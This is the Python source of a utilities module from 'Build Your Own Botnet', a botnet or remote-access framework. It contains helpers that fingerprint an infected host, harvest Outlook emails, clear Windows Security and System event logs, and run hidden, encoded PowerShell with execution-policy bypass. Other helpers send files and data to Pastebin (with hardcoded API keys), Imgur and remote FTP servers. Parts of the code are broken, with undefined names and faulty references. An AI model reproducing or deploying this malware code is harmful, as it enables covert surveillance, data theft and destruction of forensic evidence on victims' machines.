#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
import os
import sys
import time
import json
import numpy
import Queue
import pprint
import ctypes
import base64
import struct
import socket
import ctypes
import random
import urllib
import urllib2
import logging
import colorama
import itertools
import functools
import threading
import collections
import logging.handlers



class Util():
    """
    Utilities (Build Your Own Botnet)
    """
    _lock   = threading.Lock()
    _debug  = True

    @staticmethod
    def tasklogger(host, port):
        """
        Get a logger configured for reporting task results to server
        """
        logger  = logging.getLogger(__name__)
        handler = logging.SocketHandler(host, port)
        logger.setLevel(logging.DEBUG)
        logger.addHandler(handler)
        return logger

    @staticmethod
    def debug(info):
        """
        Log debugging info
        """
        if Util._debug:
            logger().debug(str(info))

    @staticmethod
    def platform():
        """
        Return the OS/platform of host machine
        """
        try:
            return sys.platform
        except Exception as e:
            debug("{} error: {}".format(Util.platform.func_name, str(e)))

    @staticmethod
    def public_ip():
        """
        Return public IP address of host machine
        """
        try:
            return urllib2.urlopen('http://api.ipify.org').read()
        except Exception as e:
            debug("{} error: {}".format(Util.public_ip.func_name, str(e)))

    @staticmethod
    def local_ip():
        """
        Return local IP address of host machine
        """
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            debug("{} error: {}".format(Util.local_ip.func_name, str(e)))

    @staticmethod
    def mac_address():
        """
        Return MAC address of host machine
        """
        try:
            return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
        except Exception as e:
            debug("{} error: {}".format(Util.mac_address.func_name, str(e)))

    @staticmethod
    def architecture():
        """
        Check if host machine has 32-bit or 64-bit processor architecture
        """
        try:
            return int(struct.calcsize('P') * 8)
        except Exception as e:
            debug("{} error: {}".format(Util.architecture.func_name, str(e)))

    @staticmethod
    def device():
        """
        Return the name of the host machine
        """
        try:
            return socket.getfqdn(socket.gethostname())
        except Exception as e:
            debug("{} error: {}".format(Util.device.func_name, str(e)))

    @staticmethod
    def username():
        """
        Return username of current logged in user
        """
        try:
            return os.getenv('USER', os.getenv('USERNAME'))
        except Exception as e:
            debug("{} error: {}".format(Util.username.func_name, str(e)))

    @staticmethod
    def administrator():
        """
        Return True if current user is administrator, otherwise False
        """
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
        except Exception as e:
            debug("{} error: {}".format(Util.administrator.func_name, str(e)))

    @staticmethod
    def ipv4(address):
        """
        Return True if input is valid IPv4 address, otherwise False
        """
        try:
            if socket.inet_aton(str(address)):
               return True
        except:
            return False

    @staticmethod
    def variable(length=6):
        """
        Generate a random alphanumeric variable name of given length
        """
        try:
            return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
        except Exception as e:
            debug("{} error: {}".format(Util.variable.func_name, str(e)))

    @staticmethod
    def status(timestamp):
        """
        Check the status of a job/thread
        """
        try:
            assert float(timestamp)
            c = time.time() - float(timestamp)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            debug("{} error: {}".format(Util.job_status.func_name, str(e)))

    @staticmethod
    def post(url, headers={}, data={}):
        """
        Make a HTTP post request and return response
        """
        try:
            dat = urllib.urlencode(data)
            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
            for key, value in headers.items():
                req.headers[key] = value
            return urllib2.urlopen(req).read()
        except Exception as e:
            debug("{} error: {}".format(Util.post_request.func_name, str(e)))

    @staticmethod
    def alert(text, title):
        """
        Windows alert message box
        """
        try:
            t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
            t.daemon = True
            t.start()
            return t
        except Exception as e:
            debug("{} error: {}".format(Util.windows_alert.func_name, str(e)))

    @staticmethod
    def normalize(source):
        """
        Normalize data/text/stream
        """
        try:
            if os.path.isfile(str(source)):
                return open(source, 'rb').read()
            elif hasattr(source, 'getvalue'):
                return source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                return source.read()
            else:
                return bytes(source)
        except Exception as e2:
            debug("{} error: {}".format(Util.imgur.func_name, str(e2)))

    @staticmethod
    def registry_key(registry_key, key, value):
        """
        Create a new Windows Registry Key in HKEY_CURRENT_USER
        """
        if os.name is 'nt':
            try:
                import _winreg
                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, registry_key, 0, _winreg.KEY_WRITE)
                _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
                _winreg.CloseKey(reg_key)
                return True
            except Exception as e:
                debug("{} error: {}".format(Util.str(e)))
        return False

    @staticmethod
    def png(image):
        """
        Takes input of raw image data and returns it a valid PNG data
        """
        try:
            if type(image) == numpy.ndarray:
                width, height = (image.shape[1], image.shape[0])
                data = image.tobytes()
            else:
                width, height = (image.width, image.height)
                data = image.rgb
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b"", b'IHDR', b"", b""]
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
            idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b"", b'IEND', b"", b""]
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
            debug("{} error: {}".format(Util.png_from_data.func_name, str(e)))

    @staticmethod
    def emails(emails):
        """
        Takes input of emails from Outlook MAPI inbox and returns them in JSON format
        """
        try:
            output = collections.OrderedDict()
            while True:
                try:
                    email = emails.GetNext()
                except: break
                if email:
                    sender   = email.SenderEmailAddress.encode('ascii','ignore')
                    message  = email.Body.encode('ascii','ignore')[:100] + '...'
                    subject  = email.Subject.encode('ascii','ignore')
                    received = str(email.ReceivedTime).replace('/','-').replace('\\','')
                    result   = {'from': sender, 'subject': subject, 'message': message}
                    output[received] = result
                else: break
            return output
        except Exception as e:
            debug("{} error: {}".format(Util.emails.func_name, str(e)))


    @staticmethod
    def display(output, color=None, style=None, pretty=False, **kwargs):
        """
        Pretty print output to console
        """
        _color = colorama.Fore.RESET
        _style = colorama.Style.NORMAL
        colorama.init(autoreset=False)
        if color:
            try:
                _color = getattr(colorama.Fore, color.upper())
            except:
                debug("color '{}' does not exist".format(color))
        if style:
            try:
                _style = getattr(colorama.Style, style.upper())
            except:
                debug("style '{}' does not exist".format(style))
        print(_color + _style, end="")
        if pretty:
            pprint.pprint(str(output), **kwargs)
        else:
            print(str(output), **kwargs)
        print(colorama.Fore.RESET + colorama.Style.NORMAL, end="")


    @staticmethod
    def delete(target):
        """
        Tries hard to delete file (via multiple methods, if necessary)
        """
        if isinstance(target, str):
            if os.path.isfile(target):
                try:
                    os.chmod(target, 777)
                except: pass
                if os.name is 'nt':
                    try:
                        _ = os.popen('attrib -h -s -r %s' % target).read()
                    except: pass
                try:
                    os.remove(target)
                except: pass
                try:
                    _ = os.popen(bytes('del /f /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            elif os.path.isdir(target):
                try:
                    _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            else:
                debug("{} error: file not found - '{}'".format(delete.func_name, filepath))
        else:
            debug("{} error: expected {}, received {}".format(delete.func_name, str, type(filepath)))

    @staticmethod
    def clear_system_logs():
        """
        Clear Windows system logs (Application, Security, Setup, System)
        """
        if os.name is 'nt':
            for log in ["application","security","setup","system"]:
                try:
                    output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
                    if output:
                        debug(output)
                except Exception as e:
                    debug("{} error: {}".format(Util.clear_system_logs.func_name, str(e)))

    @staticmethod
    def kwargs(inputstring):
        """
        Takes a string as input and returns a dictionary of keyword arguments
        """
        try:
            return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
        except Exception as e:
            debug("{} error: {}".format(Util.kwargs.func_name, str(e)))

    @staticmethod
    def system_info():
        info = {}
        for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            if hasattr(Util, func):
                try:
                    info[func] = getattr(Util, func)()
                except Exception as e:
                    debug("{} error: {}".format(Util.system.func_name, str(e)))
        return info


    @staticmethod
    def color():
        """
        Returns a random color for use in console display
        """
        try:
            return getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
        except Exception as e:
            debug("{} error: {}".format(Util.color.func_name, str(e)))


    @staticmethod
    def powershell(code):
        """
        Execute code in Powershell.exe and return any results
        """
        if os.name is 'nt':
            try:
                powershell = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' if os.path.exists('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
                return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
            except Exception as e:
                debug("{} error: {}".format(Util.powershell.func_name, str(e)))

    @staticmethod
    def imgur(source):
        """
        Upload image file/data to Imgur (requires: imgur api_key)
        """
        try:
            api_key  = resource('api imgur api_key')
            if api_key:
                data = _get_normalized_data(source)
                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})
                return str(json.loads(post)['data']['link'])
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(Util.imgur.func_name, str(e2))

    @staticmethod
    def pastebin(source, api_dev_key='daf350f687a94f079a8482a046264123', api_user_key='d05a18740c105927f3cbf38cf5acf069'):
        """
        Dump file/data to Pastebin (requires: pastebin api_dev_key)
        """
        try:
            info={'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_dev_key}
            if api_user_key:
                info.update({'api_user_key'  : api_user_key})
            paste = post('https://pastebin.com/api/api_post.php',data=info)        
            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
        except Exception as e:
            return '{} error: {}'.format(Util.pastebin.func_name, str(e))

    @staticmethod
    def ftp(source, filetype=None):
        """
        Upload file/data to FTP server (requires: FTP login credentials)
        """
        try:
            creds = Util.resource('api ftp').split()
            if creds:
                path  = ''
                local = time.ctime().split()
                if os.path.isfile(str(source)):
                    path   = source
                    source = open(str(path), 'rb')
                elif hasattr(source, 'seek'):
                    source.seek(0)
                else:
                    source = cStringIO.StringIO(bytes(source))
                try:
                    host = ftplib.FTP(**creds)
                except:
                    return "Upload failed - remote FTP server authorization error"
                addr = info.get('public_ip') if info.get('public_ip') else public_ip()
                if 'tmp' not in host.nlst():
                    host.mkd('/tmp')
                if addr not in host.nlst('/tmp'):
                    host.mkd('/tmp/{}'.format(addr))
                if path:
                    path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
                else:
                    if filetype:
                        filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                    else:
                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
                stor = host.storbinary('STOR ' + path, source)
                return path
        except Exception as e2:
            return "{} error: {}".format(Util.ftp.func_name, str(e2))

    def config(*arg, **options):
        """
        Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
        """
        def _config(function):
            @functools.wraps(function)
            def wrapper(*args, **kwargs):
                return function(*args, **kwargs)
            for k,v in options.items():
                setattr(wrapper, k, v)
            wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
            return wrapper
        return _config


    def threaded(function):
        """
        Decorator for making a function threaded
        """
        @functools.wraps(function)
        def _threaded(*args, **kwargs):
            t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
            t.daemon = True
            t.start()
            return t
        return _threaded


    def loading_animation(function):
        """
        Decorator for displaying a loading animation while the function runs in a separate thread
        """
        @functools.wraps(function)
        def function(*args, **kwargs):
            animate = itertools.cycle(['Loading.  ','Loading.. ','Loading...'])
            _thread = threaded(function)(*args, **kwargs)
            while _thread.is_alive():
                with Util._lock:
                    sys.stdout.write("\r" + next(animate))
                time.sleep(0.5)
        return _function


    def progress_bar(function):
        """
        Decorator for displaying a progress bar while the function is run in a separate thread
        """
        @functools.wraps(function)
        def function_progress(task_queue):
            if isinstance(task_queue, Queue.Queue):
                total   = current = task_queue.unfinished_tasks
                percent = lambda: round(float(total - task_queue.qsize())/float(total), 4)
            elif isinstance(task_queue, bytes):
                task_queue = iter(task_queue)
                total   = len(task_queue)
                percent = lambda: round(float(total - len(task_queue))/float(total), 4)
            elif hasattr(task_queue, '__iter__'):
                total   = task_queue.__length_hint__()
                percent = lambda: round(float(total - task_queue.__length_hint__())/float(total), 4)
            else:
                with LOCK:
                    raise TypeError("task queue must be a string, list, or queue (input type: %s)")
            t = threaded(function)(task_queue)
            while True:
                try:
                    if task_queue.empty():
                        _update_progress_bar(1.0)
                        break
                    elif task_queue.qsize() < current:
                        _update_progress_bar(percent())
                        current = task_queue.qsize()
                except:
                    break
        return function_progress

    def update_progress_bar(progress, length=50):
        """
        Worker function for the progress bar decorator
        """
        if not isinstance(progress, float):
            with LOCK:
                raise ValueError("progress must be float")
        else:
            block = int(round(length * progress))
            with LOCK:
                sys.stdout.write(colorama.Fore.RESET + colorama.Style.BRIGHT +\
                                 "\r{}% ".format(round(progress * 100.0, 4)) +\
                                 colorama.Fore.RED + colorama.Style.BRIGHT +\
                                 '|' * block + colorama.Style.DIM +\
                                 '-' * int(PROGRESS_BAR_LENGTH-block))
                sys.stdout.flush()

